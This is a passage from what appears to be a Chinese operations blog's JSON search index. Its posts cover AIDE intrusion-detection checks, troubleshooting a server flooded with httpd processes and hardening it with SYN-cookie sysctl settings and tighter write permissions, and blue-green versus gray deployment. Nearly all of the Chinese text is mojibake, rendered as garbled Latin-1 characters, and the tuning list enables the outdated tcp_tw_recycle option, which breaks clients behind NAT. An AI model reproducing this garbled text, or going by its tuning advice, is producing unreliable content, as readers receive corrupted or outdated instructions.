åœ¨ç»ˆç«¯ä¸­æŸ¥çœ‹æ£€æµ‹ç»“æœ 1aide --check æ£€æŸ¥æ–‡ä»¶æ”¹åŠ¨ ä¿å­˜åˆ°æ–‡ä»¶ 1234567 aide --check --report=file:/tmp/aide-report-`date +%Y%m%d`.txt``` å®šæ—¶ä»»åŠ¡æ‰§è¡Œaideæ£€æµ‹æŠ¥å‘Šå’Œè‡ªåŠ¨é‚®ä»¶å‘é€aideæ£€æµ‹æŠ¥å‘Š(å¦‚æœæ²¡æœ‰mail, yum install mail,è¿˜éœ€è¦æœ‰æœ¬åœ°é‚®ä»¶æœåŠ¡æ”¯æŒ, yum install sendmail;/etc/init.d/sendmail start) ``` bash crontab -e 00 02 * * * /usr/sbin/aide -C -V4 | /bin/mail -s \"AIDE REPORT $(date +%Y%m%d)\" root@localhost 5ã€å‚è€ƒ å®˜ç½‘ :http://aide.sourceforge.net/ AIDE â€“Linuxé«˜çº§å…¥ä¾µæ£€æµ‹ http://gupt12.blog.51cto.com/7651206/1263183 å‚è€ƒï¼šhttp://www.iamle.com/archives/1664.html","link":"/2015/04/01/è¿ç»´å®‰å…¨/ä½¿ç”¨AIDEåšLinuxé«˜çº§å…¥ä¾µæ£€æµ‹æ–‡ä»¶ç›‘æ§/"},{"title":"httpdè¿›ç¨‹éå¸¸å¤šï¼ŒæŸ¥æ‰¾è¢«æ”»å‡»çš„åŸå› ","text":"å‰ä¸¤å¤©ï¼Œå…¬å¸æ‰˜ç®¡åœ¨ç”µä¿¡æœºæˆ¿çš„vpsæœåŠ¡å™¨çªç„¶ç½‘ç»œä¸­æ–­ï¼Œè¿è¥å•†é‚£è¾¹è¯´æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸æ–­å¾€å¤–å‘åŒ…ï¼Œä¸¥é‡å½±å“åˆ°æœºæˆ¿çš„ç½‘ç»œï¼Œæ‰€ä»¥æŠŠè¯¥æœºå™¨çš„ç«¯å£å°äº†ï¼Œæ— æ¯”è›‹ç–¼å•Šï¼Œæ— å¥ˆä¸‹åªèƒ½äº²è‡ªè·‘åˆ°æœºæˆ¿è§£å†³é—®é¢˜ã€‚å»åˆ°æœºæˆ¿ï¼Œä½¿ç”¨topå‘½ä»¤æŸ¥çœ‹åå‘ç°httpdè¿›ç¨‹å±…ç„¶å åˆ°90%å¤šçš„CPUã€‚ ps -aux |grep httpd |wc -l å‘ç°æœ‰300å¤šä¸ªhttpdè¿›ç¨‹åº”è¯¥æ˜¯å—åˆ°SYN Floodæ”»å‡»è¿™æ—¶å€™æ²¡æœ‰ç›´æ¥æ€æ‰è¿›ç¨‹ï¼Œè¦æ‰¾å‡ºæ˜¯å“ªä¸ªç½‘ç«™å—æ”»å‡»ã€‚ top |grep httpd é€‰å–è¿›ç¨‹ä¸­å ç”¨CPU%å¤šçš„ï¼Œç”¨lsof -p pid æ¥æŸ¥çœ‹ï¼Œå¦‚æœæœ‰å‡ ä¸ªhttpdè¿›ç¨‹éƒ½æ˜¾ç¤ºåŒä¸€ä¸ªç½‘ç«™ï¼Œåˆ™åŸºæœ¬ä¸Šå¯ä»¥åˆ¤å®šè¯¥ç½‘ç«™å°±æ˜¯é—®é¢˜ç½‘ç«™ lsof -p &lt;pid&gt; æ‰¾åˆ°é—®é¢˜ç½‘ç«™ååœæ‰è¯¥ç½‘ç«™vps killall -9 httpd ,service httpd start å¼ºåˆ¶æ€æ‰httpè¿›ç¨‹ï¼Œå†é‡æ–°å¯åŠ¨ã€‚ ä»¥ä¸‹æ˜¯åœ¨ç½‘ä¸Šæ‰¾çš„é¢„é˜²SYN floodçš„åŠæ³•linuxä¸‹é˜²æ­¢SYN Floodæ”»å‡»ï¼Œèƒ½å¤Ÿæœ‰æ•ˆé˜²èŒƒSYN Floodæ”»å‡»çš„æ‰‹æ®µä¹‹ä¸€ï¼Œå°±æ˜¯SYN Cookie Linuxä¸‹è®¾ç½®å¦‚æœä½ çš„æœåŠ¡å™¨é…ç½®ä¸å¤ªå¥½ï¼ŒTCP TIME_WAITå¥—æ¥å­—æ•°é‡è¾¾åˆ°ä¸¤ã€ä¸‰ä¸‡ï¼ŒæœåŠ¡å™¨å¾ˆå®¹æ˜“è¢«æ‹–æ­»ã€‚é€šè¿‡ä¿®æ”¹Linuxå†…æ ¸å‚æ•°ï¼Œå¯ä»¥å‡å°‘æœåŠ¡å™¨çš„TIME_WAITå¥—æ¥å­—æ•°é‡ã€‚ TIME_WAITå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ï¼š ä»¥ä¸‹æ˜¯ä»£ç ç‰‡æ®µï¼š netstat -an | grep &quot;TIME_WAIT&quot; | wc -l åœ¨Linuxä¸‹ï¼Œå¦‚CentOSï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹/etc/sysctl.confæ–‡ä»¶æ¥è¾¾åˆ°ç›®çš„å¢åŠ ä»¥ä¸‹å‡ è¡Œï¼š ä»¥ä¸‹æ˜¯ä»£ç ç‰‡æ®µï¼š 12345678910net.ipv4.tcp_fin_timeout = 30net.ipv4.tcp_keepalive_time = 1200net.ipv4.tcp_syncookies = 1net.ipv4.tcp_tw_reuse = 1net.ipv4.tcp_tw_recycle = 1net.ipv4.ip_local_port_range = 1024 65000net.ipv4.tcp_max_syn_backlog = 8192net.ipv4.tcp_max_tw_buckets = 5000net.ipv4.tcp_synack_retries = 2net.ipv4.tcp_syn_retries = 2 è¯´æ˜ï¼š net.ipv4.tcp_syncookies = 1è¡¨ç¤ºå¼€å¯SYN Cookiesï¼Œè¿™æ˜¯ä¸ªBOOLEANã€‚å½“å‡ºç°SYNç­‰å¾…é˜Ÿåˆ—æº¢å‡ºæ—¶ï¼Œå¯ç”¨cookiesæ¥å¤„ç†ï¼Œå¯é˜²èŒƒå°‘é‡SYNæ”»å‡»ï¼Œé»˜è®¤ä¸º0ï¼Œè¡¨ç¤ºå…³é—­ï¼›net.ipv4.tcp_tw_reuse = 1 è¡¨ç¤ºå¼€å¯é‡ç”¨,è¿™æ˜¯ä¸ªBOOLEANã€‚å…è®¸å°†TIME-WAIT socketsé‡æ–°ç”¨äºæ–°çš„TCPè¿æ¥ï¼Œé»˜è®¤ä¸º0ï¼Œè¡¨ç¤ºå…³é—­ï¼›net.ipv4.tcp_tw_recycle = 1è¡¨ç¤ºå¼€å¯TCPè¿æ¥ä¸­TIME-WAIT socketsçš„å¿«é€Ÿå›æ”¶,è¿™æ˜¯ä¸ªBOOLEANï¼Œé»˜è®¤ä¸º0ï¼Œè¡¨ç¤ºå…³é—­ã€‚net.ipv4.tcp_fin_timeout = 30 è¡¨ç¤ºå¦‚æœå¥—æ¥å­—ç”±æœ¬ç«¯è¦æ±‚å…³é—­ï¼Œè¿™ä¸ªå‚æ•°å†³å®šäº†å®ƒä¿æŒåœ¨FIN-WAIT-2çŠ¶æ€çš„æ—¶é—´ã€‚å•ä½ä¸ºç§’ã€‚net.ipv4.tcp_keepalive_time = 1200è¡¨ç¤ºå½“keepaliveèµ·ç”¨çš„æ—¶å€™ï¼ŒTCPå‘é€keepaliveæ¶ˆæ¯çš„é¢‘åº¦ã€‚ç¼ºçœæ˜¯2å°æ—¶ï¼Œæ”¹ä¸º20åˆ†é’Ÿã€‚å•ä½ä¸ºç§’ã€‚net.ipv4.ip_local_port_range = 1024 65000 è¡¨ç¤ºç”¨äºå‘å¤–è¿æ¥çš„ç«¯å£èŒƒå›´ã€‚ç¼ºçœæƒ…å†µä¸‹å¾ˆå°ï¼š32768åˆ°61000ï¼Œæ”¹ä¸º1024åˆ°65000ã€‚net.ipv4.tcp_max_syn_backlog = 8192è¡¨ç¤ºSYNé˜Ÿåˆ—çš„é•¿åº¦ï¼Œé»˜è®¤ä¸º1024ï¼ŒåŠ å¤§é˜Ÿåˆ—é•¿åº¦ä¸º8192ï¼Œå¯ä»¥å®¹çº³æ›´å¤šç­‰å¾…è¿æ¥çš„ç½‘ç»œè¿æ¥æ•°ã€‚net.ipv4.tcp_max_tw_buckets = 5000 è¡¨ç¤ºç³»ç»ŸåŒæ—¶ä¿æŒTIME_WAITå¥—æ¥å­—çš„æœ€å¤§æ•°é‡ï¼Œå¦‚æœè¶…è¿‡è¿™ä¸ªæ•°å­—ï¼ŒTIME_WAITå¥—æ¥å­—å°†ç«‹åˆ»è¢«æ¸…é™¤å¹¶æ‰“å°è­¦å‘Šä¿¡æ¯ã€‚é»˜è®¤ä¸º180000ï¼Œæ”¹ä¸º5000ã€‚å¯¹äºApacheã€Nginxç­‰æœåŠ¡å™¨ï¼Œä¸Šå‡ è¡Œçš„å‚æ•°å¯ä»¥å¾ˆå¥½åœ°å‡å°‘TIME_WAITå¥—æ¥å­—æ•°é‡ï¼Œä½†æ˜¯å¯¹äºSquidï¼Œæ•ˆæœå´ä¸å¤§ã€‚æ­¤é¡¹å‚æ•°å¯ä»¥æ§åˆ¶TIME_WAITå¥—æ¥å­—çš„æœ€å¤§æ•°é‡ï¼Œé¿å…SquidæœåŠ¡å™¨è¢«å¤§é‡çš„TIME_WAITå¥—æ¥å­—æ‹–æ­»ã€‚net.ipv4.tcp_synack_retrieså’Œnet.ipv4.tcp_syn_retriesæ˜¯å®šä¹‰SYNé‡è¯•æ¬¡æ•°ã€‚ æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ä½¿é…ç½®ç”Ÿæ•ˆï¼š ä»¥ä¸‹æ˜¯ä»£ç ç‰‡æ®µï¼š/sbin/sysctl -p å¦‚æœä½ ä¸æƒ³ä¿®æ”¹/etc/sysctl.confï¼Œä½ ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨å‘½ä»¤ä¿®æ”¹: ä»¥ä¸‹æ˜¯ä»£ç ç‰‡æ®µï¼š /sbin/sysctl -w key=value æ‰¾æ¼æ´ï¼šé‡æ–°å®¡è§†äº†Mç«™ç›®å½•ä¸‹æ–‡ä»¶æƒé™ã€‚ä»…å¯¹å‡ ä¸ªå¿…è¦çš„ç¼“å­˜ã€é™æ€åŒ–çš„ç›®å½•ä¸ºapacheå¼€å¯äº†å†™æƒé™ï¼Œé˜²æ­¢phzLtoxn.phpæ–‡ä»¶å†æ¬¡ç”Ÿæˆã€‚ é‡æ–°å¼€å¯httpdæœåŠ¡ï¼Œä½¿ç”¨360ç½‘ç«™æ£€æµ‹å¯¹Hç«™è¿›è¡Œæ¼æ´æ£€æµ‹ï¼Œå‘ç°Mç«™ä¸­æœ‰ä¸¥é‡çš„è¿œç¨‹æ‰§è¡Œæ¼æ´ï¼Œäºæ˜¯èµ¶ç´§æ‰“äº†è¡¥ä¸ã€‚ è¡¥ä¸æ‰“å¥½ä¹‹åï¼Œé¡ºä¾¿ä¿®æ”¹äº†ç³»ç»Ÿç”¨æˆ·ã€æ•°æ®åº“ç”¨æˆ·ã€ftpç”¨æˆ·çš„å¯†ç ã€Mç«™ç³»ç»Ÿç”¨æˆ·å¯†ç ã€‚è§‚å¯Ÿå‡ æ—¥ä¹‹åï¼Œä¸€åˆ‡æ­£å¸¸ã€‚","link":"/2014/09/13/è¿ç»´å®‰å…¨/httpdè¿›ç¨‹éå¸¸å¤šï¼ŒæŸ¥æ‰¾è¢«æ”»å‡»çš„åŸå› /"},{"title":"APPè‡ªåŠ¨åŒ–éƒ¨ç½²:å¼€å‘éƒ¨ç½²-æµ‹è¯•éƒ¨ç½²-ç°åº¦å‘å¸ƒ/è“ç»¿éƒ¨ç½²-ç”Ÿäº§ç¯å¢ƒç­‰éƒ¨ç½²æµç¨‹æ–¹æ¡ˆæ€»ç»“","text":"APPè‡ªåŠ¨åŒ–éƒ¨ç½²ï¼šå¼€å‘éƒ¨ç½²ã€æµ‹è¯•éƒ¨ç½²ã€ç°åº¦å‘å¸ƒç­‰éƒ¨ç½²æ–¹æ¡ˆå¯¹æ¯”ä¸æ€»ç»“å‰è¨€ï¼šä¸ªäººç°åœ¨åœ¨ä¸€ä¸ªåŒ»ç–—è¡Œä¸šå…¬å¸ï¼šç¾å¹´å¤§è¿™è¾¹è´Ÿè´£ä½“æ£€APPçš„è¿ç»´ç›¸å…³å·¥ä½œï¼Œä»Šå¤©ä¸»è¦æ˜¯æ•´ç†äº†ä¸‹ç°åœ¨å›¢é˜ŸAPPå‘å¸ƒæµç¨‹æ–¹æ¡ˆï¼š å› ä¸ºåœ¨é¡¹ç›®è¿­ä»£çš„è¿‡ç¨‹ä¸­ï¼Œä¸å¯é¿å…éœ€è¦â€ä¸Šçº¿â€ã€‚ä¸Šçº¿å¯¹åº”ç€éƒ¨ç½²ï¼Œæˆ–è€…é‡æ–°éƒ¨ç½²ï¼›éƒ¨ç½²å¯¹åº”ç€ä¿®æ”¹ï¼›ä¿®æ”¹åˆ™æ„å‘³ç€é£é™©ã€‚ç›®å‰æœ‰å¾ˆå¤šç”¨äºéƒ¨ç½²çš„æŠ€æœ¯ï¼Œæœ‰çš„ç®€å•ï¼Œæœ‰çš„å¤æ‚ï¼›æœ‰çš„å¾—åœæœºï¼Œæœ‰çš„ä¸éœ€è¦åœæœºå³å¯å®Œæˆéƒ¨ç½²ã€‚ ä¸ªäººæ•´ç†ä¸‹éƒ¨ç½²æµç¨‹è¯´æ˜å…¶å®ç°åœ¨å¾ˆå¤šéƒ¨ç½²æ–¹æ³•ï¼Œç°åœ¨æˆ‘ä»¬ç”¨ç›®å‰æ¯”è¾ƒæµè¡Œçš„å‡ ç§éƒ¨ç½²æ–¹æ¡ˆï¼Œæˆ–è€…è¯´ç­–ç•¥æ–¹æ¡ˆå¯¹æ¯”æ€»ç»“ç®€å•è®¨è®ºä¸€ä¸‹ç›®å‰æ¯”è¾ƒæµè¡Œçš„å‡ ç§éƒ¨ç½²æ–¹æ¡ˆï¼Œæˆ–è€…è¯´ç­–ç•¥ã€‚å¦‚æœ‰ä¸è¶³ä¹‹å¤„è¯·æŒ‡å‡ºï¼Œå¦‚æœ‰è°¬è¯¯ï¼Œè¯·æŒ‡æ­£^_^ã€‚ æˆ‘ä»¬æœ‰è‡ªå·±å¼€å‘ç¯å¢ƒå’Œæµ‹è¯•ç¯å¢ƒ ï¼š å¼€å‘ç¯å¢ƒéƒ¨ç½²ï¼š é—®é¢˜ï¼š å¼€å‘äººå‘˜æ¯ä¸ªäººåœ¨è‡ªå·±ç”µè„‘ç¯å¢ƒå†™ä»£ç è‡ªå·±ç”µè„‘æœ¬æœºæµ‹è¯•ä»£ç æ˜¯å¦runæˆåŠŸï¼Œæ¯ä¸ªå¼€å‘äººå‘˜éƒ½åœ¨è‡ªå·±æœ¬åœ°å†™å®Œæµ‹è¯•å‡ºç°é—®é¢˜æ˜¯å„è‡ªç¯å¢ƒä¸ç»Ÿä¸€å¯¼è‡´é‡åˆ°å‘é˜»ç¢åˆ°æµ‹è¯•äººå‘˜æµ‹è¯•ï¼ŒåŸºç¡€çš„bugä¹Ÿä¼šæµªè´¹å¤ªå¤šæ—¶é—´ã€‚ è§£å†³åï¼š ä¸»è¦æ˜¯è§£å†³äº†ç»™äºˆå¼€å‘å›¢é˜Ÿåœ¨å†™ä»£ç æˆ–è€…ä¿®æ”¹bugå¯ä»¥ç¬¬ä¸€æ—¶é—´æ›´æ–°éƒ¨ç½²ã€‚å¤§å®¶ç»Ÿä¸€ä¸€ä¸ªå¼€å‘ç¯å¢ƒè¿™ä¸ªæ˜¯ä¸ºäº†åœ¨å¼€å‘é˜¶æ®µèƒ½ç«‹é©¬å‘ˆç°æ•ˆæœã€‚ æµ‹è¯•ç¯å¢ƒéƒ¨ç½²ï¼š é—®é¢˜ï¼š ä¸€å¼€å§‹æ²¡æœ‰æµ‹è¯•ç¯å¢ƒï¼Œç›´æ¥å¼€å‘ç¯å¢ƒå½“ä½œæµ‹è¯•ç¯å¢ƒå»è·‘ï¼Œå‘ç°å¾ˆå¤šé—®é¢˜ï¼Œå°±æ˜¯æµ‹è¯•ç¯å¢ƒæ•°æ®è·Ÿç”Ÿäº§ä¸ä¸€æ ·ï¼Œå¯¼è‡´å¾ˆå¤šbugé—®é¢˜ï¼Œæµ‹è¯•å‘ç°æµ‹è¯•çš„æ—¶å€™ï¼Œå¼€å‘åœ¨æ›´æ–°ä»£ç å‘å¸ƒï¼Œè€½è¯¯äº†æµ‹è¯•äººå‘˜çš„æµ‹è¯•è¿‡ç¨‹ï¼Œç¯å¢ƒä¸èƒ½ç‹¬ç«‹éƒ½äº’ç›¸å ç”¨ï¼Œåˆ€å­æ•ˆç‡æ²¡æœ‰æé«˜ï¼Œbugæ¯ä¸ªæ˜ŸæœŸéƒ½ä¸æ–­æå‡ã€‚ è§£å†³åï¼š ä¸»è¦è§£å†³äº†å¼€å‘ç¯å¢ƒå’Œæµ‹è¯•ç¯å¢ƒç‹¬ç«‹ï¼Œä¸ä¼šäº’ç›¸å½±å“ï¼Œæµ‹è¯•äººå‘˜æœ‰å•ç‹¬ç¯å¢ƒå»æµ‹è¯•ç”Ÿäº§èƒ½å‡†ç¡®çš„æ•°æ®å¯¹æ¯”ã€‚ é€‰æ‹©ç°åº¦ç¯å¢ƒéƒ¨ç½²æ–¹æ¡ˆï¼šå…ˆè´´ä¸ªç™¾åº¦ç™¾ç§‘ï¼š ç°åº¦å‘å¸ƒæ˜¯æŒ‡åœ¨é»‘ä¸ç™½ä¹‹é—´ï¼Œèƒ½å¤Ÿå¹³æ»‘è¿‡æ¸¡çš„ä¸€ç§å‘å¸ƒæ–¹å¼ã€‚AB testå°±æ˜¯ä¸€ç§ç°åº¦å‘å¸ƒæ–¹å¼ï¼Œè®©ä¸€éƒ¨åˆ†ç”¨æˆ·ç»§ç»­ç”¨Aï¼Œä¸€éƒ¨åˆ†ç”¨æˆ·å¼€å§‹ç”¨Bï¼Œå¦‚æœç”¨æˆ·å¯¹Bæ²¡æœ‰ä»€ä¹ˆåå¯¹æ„è§ï¼Œé‚£ä¹ˆé€æ­¥æ‰©å¤§èŒƒå›´ï¼ŒæŠŠæ‰€æœ‰ç”¨æˆ·éƒ½è¿ç§»åˆ°Bä¸Šé¢æ¥ã€‚ç°åº¦å‘å¸ƒå¯ä»¥ä¿è¯æ•´ä½“ç³»ç»Ÿçš„ç¨³å®šï¼Œåœ¨åˆå§‹ç°åº¦çš„æ—¶å€™å°±å¯ä»¥å‘ç°ã€è°ƒæ•´é—®é¢˜ï¼Œä»¥ä¿è¯å…¶å½±å“åº¦ã€‚ ç°åº¦ç¯å¢ƒéƒ¨ç½²: ä¸ªäººç†è§£ç°åº¦éƒ¨ç½²æ˜¯å¢é‡å‘å¸ƒçš„ä¸€ç§ç±»å‹ï¼Œå®ƒçš„æ‰§è¡Œæ–¹å¼æ˜¯åœ¨åŸæœ‰è½¯ä»¶ç”Ÿäº§ç‰ˆæœ¬å¯ç”¨çš„æƒ…å†µä¸‹ï¼ŒåŒæ—¶éƒ¨ç½²ä¸€ä¸ªæ–°çš„ç‰ˆæœ¬ã€‚åŒæ—¶è¿è¡ŒåŒä¸€ä¸ªè½¯ä»¶äº§å“çš„å¤šä¸ªç‰ˆæœ¬éœ€è¦è½¯ä»¶é’ˆå¯¹é…ç½®å’Œå®Œç¾è‡ªåŠ¨åŒ–éƒ¨ç½²è¿›è¡Œç‰¹åˆ«è®¾è®¡ã€‚ 1234567(1) å‡†å¤‡å¥½éƒ¨ç½²å„ä¸ªé˜¶æ®µçš„å·¥ä»¶ï¼ŒåŒ…æ‹¬ï¼šæ„å»ºå·¥ä»¶ï¼Œæµ‹è¯•è„šæœ¬ï¼Œé…ç½®æ–‡ä»¶å’Œéƒ¨ç½²æ¸…å•æ–‡ä»¶ã€‚(2) ä»è´Ÿè½½å‡è¡¡åˆ—è¡¨ä¸­ç§»é™¤æ‰â€œéƒ¨ç½²ç°åº¦ç¯å¢ƒâ€æœåŠ¡å™¨ã€‚(3) å‡çº§â€œç°åº¦éƒ¨ç½²â€åº”ç”¨ï¼ˆæ’æ‰åŸæœ‰æµé‡å¹¶è¿›è¡Œéƒ¨ç½²ï¼‰ã€‚(4) å¯¹åº”ç”¨è¿›è¡Œè‡ªåŠ¨åŒ–æµ‹è¯•ã€‚(5) å°†â€œç°åº¦ç¯å¢ƒâ€æœåŠ¡å™¨é‡æ–°æ·»åŠ åˆ°è´Ÿè½½å‡è¡¡åˆ—è¡¨ä¸­ï¼ˆè¿é€šæ€§å’Œå¥åº·æ£€æŸ¥ï¼‰ã€‚(6) å¦‚æœâ€œç°åº¦ç¯å¢ƒâ€åœ¨çº¿ä½¿ç”¨æµ‹è¯•æˆåŠŸï¼Œå‡çº§å‰©ä½™çš„å…¶ä»–æœåŠ¡å™¨ã€‚ï¼ˆå¦åˆ™å°±å›æ»šï¼‰ç°åº¦å‘å¸ƒä¸­ï¼Œå¸¸å¸¸æŒ‰ç…§ç”¨æˆ·è®¾ç½®è·¯ç”±æƒé‡ï¼Œä¾‹å¦‚90%çš„ç”¨æˆ·ç»´æŒä½¿ç”¨è€ç‰ˆæœ¬ï¼Œ10%çš„ç”¨æˆ·å°é²œæ–°ç‰ˆæœ¬ã€‚ä¸åŒç‰ˆæœ¬åº”ç”¨å…±å­˜ï¼Œç»å¸¸ä¸A/Bæµ‹è¯•ä¸€èµ·ä½¿ç”¨ï¼Œç”¨äºæµ‹è¯•é€‰æ‹©å¤šç§æ–¹æ¡ˆã€‚ç°åº¦å‘å¸ƒæ¯”è¾ƒå…¸å‹çš„ä¾‹å­ ç¬¬1æ­¥: æŠŠç»¿è‰²é›†ç¾¤çš„çŠ¶æ€æ”¹ä¸ºâ€™å¤‡ç”¨â€™. ä»è´Ÿè½½å‡è¡¡çš„æ± é‡ŒæŠŠè¿™äº›åœ°å€å»æ‰,è¿™æ ·,ç»¿è‰²çš„é›†ç¾¤å°±ä¸å†å›æ¥æ”¶åˆ°æ¥è‡ªç”¨æˆ·çš„è¯·æ±‚äº†.è½¬è€Œè¿›å…¥å¤‡ç”¨è´Ÿè½½å‡è¡¡çš„æ± é‡Œ. é€‰æ‹©è“ç»¿ç¯å¢ƒéƒ¨ç½²æ–¹æ¡ˆï¼šè“ç»¿å‘å¸ƒçš„æ„ä¹‰æ•´ä¸ªå‘å¸ƒè¿‡ç¨‹ï¼Œç”¨æˆ·æ²¡æœ‰æ„Ÿå—åˆ°ä»»ä½•å®•æœºæˆ–è€…æœåŠ¡é‡å¯ã€‚ è“ç»¿å‘å¸ƒçš„è¿‡ç¨‹ ç¬¬0æ­¥:éƒ¨ç½²ä»¥å‰çš„é…ç½®.png) ç¬¬1æ­¥: æŠŠç»¿è‰²é›†ç¾¤çš„çŠ¶æ€æ”¹ä¸ºâ€™å¤‡ç”¨â€™. ä»è´Ÿè½½å‡è¡¡çš„æ± é‡ŒæŠŠè¿™äº›åœ°å€å»æ‰,è¿™æ ·,ç»¿è‰²çš„é›†ç¾¤å°±ä¸å†å›æ¥æ”¶åˆ°æ¥è‡ªç”¨æˆ·çš„è¯·æ±‚äº†.è½¬è€Œè¿›å…¥å¤‡ç”¨è´Ÿè½½å‡è¡¡çš„æ± é‡Œ..png) ç¬¬2æ­¥:åœ¨ç»¿è‰²é›†ç¾¤é‡Œéƒ¨ç½²æ–°çš„ä»£ç ,ç›´åˆ°åº”ç”¨å¯åŠ¨æˆåŠŸ.png) ç¬¬3æ­¥:ä½¿ç”¨å¤‡ç”¨è´Ÿè½½å‡è¡¡ç®€å•æµ‹è¯•ä¸€ä¸‹å¤‡ç”¨é›†ç¾¤çš„éƒ¨ç½²æƒ…å†µ.ç†æƒ³çŠ¶æ€ä¸‹æ˜¯å…¨è‡ªåŠ¨çš„. ç¬¬4æ­¥:æŠŠç»¿è‰²å¤‡ç”¨é›†ç¾¤çš„çŠ¶æ€æ”¹æˆå­˜è´§,äºæ˜¯è¿›å…¥äº†å­˜æ´»è´Ÿè½½å‡è¡¡çš„æ± é‡Œ.png)çœ‹åˆ° è“è‰²è¿è¡Œv1ç‰ˆæœ¬,ç»¿è‰²è¿è¡Œv2ç‰ˆæœ¬,éƒ½è¿æ¥çš„æ˜¯ç›¸åŒçš„æ•°æ®åº“.è¿™æ„å‘³ç€v2ç‰ˆæœ¬ä¹Ÿè¦åœ¨è€çš„æ•°æ®æ¨¡å‹ä¸Šè¿è¡Œ.å¦‚æœæ•°æ®åº“æœ‰å˜æ›´,è¦ç­‰åˆ°æ‰€æœ‰çš„é›†ç¾¤å‡çº§åˆ°æ–°çš„ä»£ç ä¸Š. ç¬¬5æ­¥: å¯¹è“è‰²é›†ç¾¤ä¹Ÿè¿›è¡ŒåŒæ ·çš„æ“ä½œ..png).png) æœ€ç»ˆv2ä»£ç å®Œæˆéƒ¨ç½²..png) ç¬¬6æ­¥:æ ¹æ®æƒ…å†µ.è¿è¡Œæ•°æ®åº“è¿ç§» å‚è€ƒï¼štks green-deployment æ€»ç»“ï¼š1) è“ç»¿éƒ¨ç½²ï¼šä¸åœæ­¢è€ç‰ˆæœ¬ï¼Œé¢å¤–æä¸€å¥—æ–°ç‰ˆæœ¬ï¼Œç­‰æµ‹è¯•å‘ç°æ–°ç‰ˆæœ¬OKåï¼Œåˆ é™¤è€ç‰ˆæœ¬ã€‚å…¶å®è¿™é‡Œåˆ é™¤è€ç‰ˆæœ¬ä¹Ÿå°±æ˜¯é‡æ–°éƒ¨ç½²äº†è€ç‰ˆæœ¬æˆä¸ºæ–°ç‰ˆæœ¬ä¸€èµ·æ”¾ä¸Šå»ï¼Œç­‰éœ€è¦æ›´æ–°å‘å¸ƒè¿ä¸‹æœŸä¸­ä¸€ä¸ªç‰ˆæœ¬ç¯å¢ƒéƒ¨ç½²ï¼šç°åœ¨æˆ‘ä»¬å…¬å¸ä½¿ç”¨è“ç»¿éƒ¨ç½²æ–¹æ¡ˆã€‚ 3) ç°åº¦å‘å¸ƒï¼šä¸åœæ­¢è€ç‰ˆæœ¬ï¼Œé¢å¤–æä¸€å¥—æ–°ç‰ˆæœ¬ï¼Œå¸¸å¸¸æŒ‰ç…§ç”¨æˆ·è®¾ç½®è·¯ç”±æƒé‡ï¼Œä¾‹å¦‚90%çš„ç”¨æˆ·ç»´æŒä½¿ç”¨è€ç‰ˆæœ¬ï¼Œ10%çš„ç”¨æˆ·å°é²œæ–°ç‰ˆæœ¬ã€‚ä¸åŒç‰ˆæœ¬åº”ç”¨å…±å­˜ï¼Œç»å¸¸ä¸A/Bæµ‹è¯•ä¸€èµ·ä½¿ç”¨ï¼Œç”¨äºæµ‹è¯•é€‰æ‹©å¤šç§æ–¹æ¡ˆã€‚ å…¶å®ä¸¤ç§å«ä¹‰ä¸ªäººè®¤ä¸ºç›¸å·®ä¸æ˜¯ç‰¹åˆ«å¤§ï¼Œéƒ½ç‰¹åˆ«é€‚åˆç°åœ¨å‘å¸ƒéƒ¨ç½²æµç¨‹æ–¹æ¡ˆã€‚äº¤æµå­¦ä¹ ï¼šğŸ§ Linux shell_é«˜çº§è¿ç»´æ´¾: 459096184 åœˆå­ (ç³»ç»Ÿè¿ç»´-åº”ç”¨è¿ç»´-è‡ªåŠ¨åŒ–è¿ç»´-è™šæ‹ŸåŒ–æŠ€æœ¯ç ”ç©¶æ¬¢è¿åŠ å…¥)ğŸ§ BigData-Exchange School : 521621407 åœˆå­ï¼ˆå¤§æ•°æ®è¿ç»´)ï¼ˆHadoopå¼€å‘äººå‘˜)ï¼ˆå¤§æ•°æ®ç ”ç©¶çˆ±å¥½è€…) æ¬¢è¿åŠ å…¥ ç›¸åº”Bidataæœ‰å†…éƒ¨å¾®ä¿¡äº¤æµç¾¤äº’ç›¸å­¦ä¹ ï¼ŒåŠ å…¥QQç¾¤æœ‰é“¾æ¥ã€‚","link":"/2017/03/15/è¿ç»´ç¬”è®°/APPè‡ªåŠ¨åŒ–éƒ¨ç½²:å¼€å‘éƒ¨ç½²-æµ‹è¯•éƒ¨ç½²-ç°åº¦å‘å¸ƒ:è“ç»¿éƒ¨ç½²-ç”Ÿäº§ç¯å¢ƒç­‰éƒ¨ç½²æµç¨‹æ–¹æ¡ˆæ€»ç»“/"},{"title":"ã€ç¿»è¯‘ã€‘ç›‘æ§ä¸åªæ˜¯ä¸ºäº†å¤„ç†æ•…éšœ","text":"ã€ç¿»è¯‘ã€‘ç›‘æ§ä¸åªæ˜¯ä¸ºäº†å¤„ç†æ•…éšœæœ‰ä¸€ç§æ™®éçš„æƒ³æ³•è®¤ä¸ºç›‘æ§åªæ˜¯åœ¨ç³»ç»Ÿå‡ºé”™çš„æ—¶å€™èƒ½å¤Ÿå‘å‡ºæŠ¥è­¦ï¼Œæˆ‘ä»¬ä¸€ç›´ç›¸ä¿¡ï¼Œç›‘æ§ç³»ç»Ÿçš„æ–¹æ–¹é¢é¢ç»™äºˆæˆ‘ä»¬æ´å¯Ÿä¸šåŠ¡å†…éƒ¨æœºåˆ¶çš„èƒ½åŠ›ï¼Œå¹¶é©±åŠ¨æˆ‘ä»¬åšå‡ºå†³ç­–ã€‚ä¸åŒçš„äººæœ‰ä¸åŒçš„ç›‘æ§æ–¹å¼ï¼Œæ‰‹åŠ¨æŸ¥çœ‹æ—¥å¿—ï¼Œæ¥å—æŠ¥è­¦æˆ–è€…24x7å€¼å®ˆæŸ¥çœ‹å„ç§å›¾è¡¨ã€‚ä¸ç®¡ä½ ç”¨é‚£ç§æ–¹å¼ï¼Œæœ€é‡è¦çš„æ˜¯åŠæ—¶æ”¶åˆ°æŠ¥é”™å’Œè­¦å‘Šã€‚ä½†æ˜¯ç›‘æ§å…¶å®èƒ½åšçš„æ›´å¤šã€‚ ç›‘æ§ä¸æ­¢ç”¨äºæ•…éšœæ—¶å€™å‘æŠ¥è­¦ ç›‘æ§ç³»ç»Ÿä¸åº”è¯¥åªæ˜¯å‘Šè¯‰ä½ 